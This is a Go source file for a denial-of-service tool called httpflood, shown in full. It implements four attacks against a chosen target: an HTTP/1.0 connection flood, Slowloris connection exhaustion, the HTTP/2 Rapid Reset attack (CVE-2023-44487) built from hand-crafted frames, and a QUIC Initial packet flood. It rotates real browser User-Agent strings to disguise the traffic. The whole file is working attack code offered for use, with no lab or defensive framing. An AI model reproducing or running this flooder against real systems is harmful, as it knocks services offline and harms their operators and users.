package httpflood

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	mrand "math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const tag = "\x1b[91m[HTTP]\x1b[0m"

// Mode selects the HTTP DoS technique.
type Mode int

const (
	ModeHTTP10 Mode = iota // HTTP/1.0 connection flood
	ModeHTTP11             // HTTP/1.1 Slowloris connection exhaustion
	ModeHTTP2              // HTTP/2 Rapid Reset (CVE-2023-44487)
	ModeHTTP3              // HTTP/3 QUIC Initial packet flood
)

// Flooder sends HTTP-layer denial-of-service traffic.
// Count sets concurrent connections/workers (0 = protocol default).
// Rate sets total operations per second across all workers (0 = full speed).
type Flooder struct {
	Interface string
	Target    string
	Port      uint16
	Mode      Mode
	Count     int
	Rate      int
}

// Defaults per mode.
const (
	defH10Workers = 64
	defH11Conns   = 500
	defH2Workers  = 16
	defH3Workers  = 32
)

func (f *Flooder) concurrency(def int) int {
	if f.Count > 0 {
		return f.Count
	}
	return def
}

// Randomised legitimate User-Agent strings.
var userAgents = [20]string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.67",
}

func randUA() string { return userAgents[mrand.Intn(len(userAgents))] }

func randBytes(n int) []byte {
	b := make([]byte, n)
	crand.Read(b)
	return b
}

// Run starts the selected HTTP DoS flood and blocks until interrupted.
func (f *Flooder) Run() error {
	addr := fmt.Sprintf("%s:%d", f.Target, f.Port)

	var sent int64
	done := make(chan struct{})

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() { <-sig; close(done) }()

	// Per-second stats ticker.
	statTick := time.NewTicker(time.Second)
	defer statTick.Stop()
	go func() {
		last := int64(0)
		for {
			select {
			case <-done:
				return
			case <-statTick.C:
				cur := atomic.LoadInt64(&sent)
				delta := cur - last
				last = cur
				switch f.Mode {
				case ModeHTTP11:
					fmt.Printf("%s %-21s  open=%d  +%d new/s\n", tag, addr, cur, delta)
				case ModeHTTP2:
					fmt.Printf("%s %-21s  %d RST-pairs/s  total=%d\n", tag, addr, delta, cur)
				case ModeHTTP3:
					fmt.Printf("%s %-21s  %d QUIC-pkts/s  total=%d\n", tag, addr, delta, cur)
				default:
					fmt.Printf("%s %-21s  %d req/s  total=%d\n", tag, addr, delta, cur)
				}
			}
		}
	}()

	// Global rate-limiter: all goroutines compete for ticks → Rate ops/s total.
	var rateC <-chan time.Time
	if f.Rate > 0 {
		rt := time.NewTicker(time.Second / time.Duration(f.Rate))
		defer rt.Stop()
		rateC = rt.C
	}

	switch f.Mode {
	case ModeHTTP10:
		return f.runHTTP10(addr, &sent, done, rateC)
	case ModeHTTP11:
		return f.runHTTP11(addr, &sent, done)
	case ModeHTTP2:
		return f.runHTTP2(addr, &sent, done, rateC)
	case ModeHTTP3:
		return f.runHTTP3(addr, &sent, done, rateC)
	}
	return nil
}

// ─── HTTP/1.0 Connection Flood ───────────────────────────────────────────────
// Each goroutine opens a TCP connection, sends one GET / HTTP/1.0 request,
// reads the response header, closes and immediately reconnects.

func (f *Flooder) runHTTP10(addr string, sent *int64, done <-chan struct{}, rateC <-chan time.Time) error {
	n := f.concurrency(defH10Workers)
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-done:
					return
				default:
				}
				if rateC != nil {
					select {
					case <-done:
						return
					case <-rateC:
					}
				}
				conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					time.Sleep(50 * time.Millisecond)
					continue
				}
				req := "GET / HTTP/1.0\r\n" +
					"Host: " + f.Target + "\r\n" +
					"User-Agent: " + randUA() + "\r\n" +
					"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n" +
					"Accept-Language: en-US,en;q=0.9\r\n" +
					"Connection: close\r\n\r\n"
				conn.SetDeadline(time.Now().Add(5 * time.Second))
				conn.Write([]byte(req))
				buf := make([]byte, 512)
				for {
					if _, err := conn.Read(buf); err != nil {
						break
					}
				}
				conn.Close()
				atomic.AddInt64(sent, 1)
			}
		}()
	}
	wg.Wait()
	return nil
}

// ─── HTTP/1.1 Slowloris ──────────────────────────────────────────────────────
// Opens many TCP connections, each sending a partial HTTP/1.1 request
// (headers without the terminating blank line) and drip-feeding keep-alive
// headers every 10 s to prevent server-side idle timeouts.

func (f *Flooder) runHTTP11(addr string, sent *int64, done <-chan struct{}) error {
	maxConns := f.concurrency(defH11Conns)

	var mu sync.Mutex
	conns := make([]net.Conn, 0, maxConns)

	// openOne opens a single Slowloris connection.
	openOne := func() {
		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			return
		}
		conn.SetDeadline(time.Now().Add(60 * time.Second))
		hdr := "GET / HTTP/1.1\r\n" +
			"Host: " + f.Target + "\r\n" +
			"User-Agent: " + randUA() + "\r\n" +
			"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n" +
			"Accept-Language: en-US,en;q=0.9\r\n" +
			"Content-Length: 65536\r\n"
		if _, err := conn.Write([]byte(hdr)); err != nil {
			conn.Close()
			return
		}
		mu.Lock()
		conns = append(conns, conn)
		mu.Unlock()
		atomic.AddInt64(sent, 1)
	}

	// Refiller goroutine: keeps the connection pool at maxConns.
	go func() {
		for {
			select {
			case <-done:
				return
			default:
			}
			mu.Lock()
			need := maxConns - len(conns)
			mu.Unlock()
			for i := 0; i < need; i++ {
				select {
				case <-done:
					return
				default:
				}
				openOne()
			}
			if need == 0 {
				time.Sleep(500 * time.Millisecond)
			}
		}
	}()

	// Drip-feed an X-header every 10 s to keep connections alive.
	drip := time.NewTicker(10 * time.Second)
	defer drip.Stop()
	for {
		select {
		case <-done:
			mu.Lock()
			for _, c := range conns {
				c.Close()
			}
			mu.Unlock()
			return nil
		case <-drip.C:
			mu.Lock()
			alive := conns[:0]
			for _, c := range conns {
				c.SetDeadline(time.Now().Add(30 * time.Second))
				if _, err := fmt.Fprintf(c, "X-a: %d\r\n", mrand.Int31()); err != nil {
					c.Close()
				} else {
					alive = append(alive, c)
				}
			}
			conns = alive
			mu.Unlock()
		}
	}
}

// ─── HTTP/2 Rapid Reset (CVE-2023-44487) ─────────────────────────────────────
// Each goroutine maintains one TLS/h2 connection and floods HEADERS+RST_STREAM
// pairs without waiting for server responses, exhausting server stream tables.

func h2Frame(ftype, flags byte, streamID uint32, payload []byte) []byte {
	f := make([]byte, 9+len(payload))
	l := uint32(len(payload))
	f[0] = byte(l >> 16)
	f[1] = byte(l >> 8)
	f[2] = byte(l)
	f[3] = ftype
	f[4] = flags
	binary.BigEndian.PutUint32(f[5:], streamID&0x7FFFFFFF)
	copy(f[9:], payload)
	return f
}

// hpackHeaders returns a minimal HPACK-encoded header block for GET /.
// Uses indexed representations from the static table (RFC 9204 §A).
func hpackHeaders(host, ua string) []byte {
	var b []byte
	b = append(b, 0x82)      // :method: GET  (static index 2)
	b = append(b, 0x84)      // :path: /       (static index 4)
	b = append(b, 0x87)      // :scheme: https (static index 7)
	b = append(b, 0x41)      // :authority — literal+incremental, name index 1
	b = hpackStr(b, host)
	b = append(b, 0x00)      // user-agent — literal without indexing, new name
	b = hpackStr(b, "user-agent")
	b = hpackStr(b, ua)
	return b
}

// hpackStr appends an HPACK string (no Huffman, 7-bit length prefix).
func hpackStr(b []byte, s string) []byte {
	n := len(s)
	if n < 127 {
		return append(append(b, byte(n)), s...)
	}
	b = append(b, 0x7F) // saturate 7-bit prefix
	n -= 127
	for n >= 128 {
		b = append(b, byte(n%128+128))
		n /= 128
	}
	return append(append(b, byte(n)), s...)
}

const h2Preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

func (f *Flooder) runHTTP2(addr string, sent *int64, done <-chan struct{}, rateC <-chan time.Time) error {
	n := f.concurrency(defH2Workers)
	tlsCfg := &tls.Config{
		ServerName:         f.Target,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
	}

	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := tls.DialWithDialer(
					&net.Dialer{Timeout: 5 * time.Second},
					"tcp", addr, tlsCfg,
				)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				f.h2RSTFlood(conn, sent, done, rateC)
				conn.Close()
			}
		}()
	}
	wg.Wait()
	return nil
}

func (f *Flooder) h2RSTFlood(conn *tls.Conn, sent *int64, done <-chan struct{}, rateC <-chan time.Time) {
	// RFC 9113 §3.4 — client connection preface.
	conn.Write([]byte(h2Preface))
	// Send empty SETTINGS (no parameters).
	conn.Write(h2Frame(0x04, 0x00, 0, nil))

	// Drain server frames in the background so the OS send buffer never fills.
	go func() {
		buf := make([]byte, 4096)
		for {
			conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			if _, err := conn.Read(buf); err != nil {
				return
			}
		}
	}()

	// Brief wait for server SETTINGS, then acknowledge.
	time.Sleep(20 * time.Millisecond)
	conn.Write(h2Frame(0x04, 0x01, 0, nil)) // SETTINGS ACK

	headers := hpackHeaders(f.Target, randUA())

	var rstBuf [4]byte
	binary.BigEndian.PutUint32(rstBuf[:], 0x8) // error code CANCEL

	var streamID uint32 = 1
	for {
		select {
		case <-done:
			return
		default:
		}
		if rateC != nil {
			select {
			case <-done:
				return
			case <-rateC:
			}
		}

		// HEADERS frame: type=0x01, flags=END_HEADERS(0x04), stream N.
		if _, err := conn.Write(h2Frame(0x01, 0x04, streamID, headers)); err != nil {
			return
		}
		// RST_STREAM frame: type=0x03, flags=0, stream N, error=CANCEL.
		if _, err := conn.Write(h2Frame(0x03, 0x00, streamID, rstBuf[:])); err != nil {
			return
		}
		atomic.AddInt64(sent, 1)

		streamID += 2            // client uses odd-numbered stream IDs
		if streamID > 0x3FFFFFFF { // near 31-bit limit → reconnect
			return
		}
	}
}

// ─── HTTP/3 QUIC Initial Packet Flood ────────────────────────────────────────
// Sends many QUIC v1 Initial packets (RFC 9000), each with a unique random
// Destination Connection ID, forcing the server to allocate new connection state
// for every packet it tries to process.

// buildQUICInitial builds a QUIC v1 Initial packet padded to ≥1200 bytes
// (RFC 9000 §14.1) with the given DCID and a random SCID.
func buildQUICInitial(dcid []byte) []byte {
	scid := randBytes(8)

	// Header layout:
	//  1  first byte
	//  4  version
	//  1  DCID length
	//  N  DCID
	//  1  SCID length
	//  8  SCID
	//  1  token length (0)
	//  2  Length varint (2-byte form)
	hdrSize := 18 + len(dcid)

	// Payload = Packet Number (1 B) + CRYPTO frame + PADDING
	payloadLen := 1200 - hdrSize
	if payloadLen < 16 {
		payloadLen = 16
	}

	// Minimal CRYPTO frame carrying fake TLS data.
	// type=0x06, offset=0x00, length=0x06, 6 bytes of placeholder.
	cryptoFrame := []byte{0x06, 0x00, 0x06, 0x01, 0x03, 0x03, 0x00, 0x20, 0x00, 0x00}

	// PADDING fills the rest of the payload (type 0x00 = PADDING frame).
	padLen := payloadLen - 1 - len(cryptoFrame)
	if padLen < 0 {
		padLen = 0
	}

	var b []byte
	// First byte: Header Form=1, Fixed Bit=1, Long Packet Type=Initial(00),
	// Reserved=00, Packet Number Length=00 (1-byte PN).
	b = append(b, 0xC0)
	// QUIC version 1.
	b = append(b, 0x00, 0x00, 0x00, 0x01)
	// DCID.
	b = append(b, byte(len(dcid)))
	b = append(b, dcid...)
	// SCID.
	b = append(b, byte(len(scid)))
	b = append(b, scid...)
	// Token Length = 0 (1-byte varint).
	b = append(b, 0x00)
	// Length field (2-byte varint, RFC 9000 §16): 0x4000 | value.
	b = append(b, byte(0x40|(payloadLen>>8)), byte(payloadLen&0xFF))
	// Packet Number (1 byte).
	b = append(b, 0x00)
	// CRYPTO frame.
	b = append(b, cryptoFrame...)
	// PADDING.
	b = append(b, make([]byte, padLen)...)
	return b
}

func (f *Flooder) runHTTP3(addr string, sent *int64, done <-chan struct{}, rateC <-chan time.Time) error {
	n := f.concurrency(defH3Workers)
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			// Each goroutine reuses one UDP "connection" (just sets the default
			// remote addr; QUIC uses its own connection IDs anyway).
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			defer conn.Close()

			dcid := make([]byte, 8)
			for {
				select {
				case <-done:
					return
				default:
				}
				if rateC != nil {
					select {
					case <-done:
						return
					case <-rateC:
					}
				}

				// New random DCID per packet → server creates a fresh connection entry.
				crand.Read(dcid)
				pkt := buildQUICInitial(dcid)
				conn.SetWriteDeadline(time.Now().Add(time.Second))
				conn.Write(pkt)
				atomic.AddInt64(sent, 1)
			}
		}()
	}
	wg.Wait()
	return nil
}
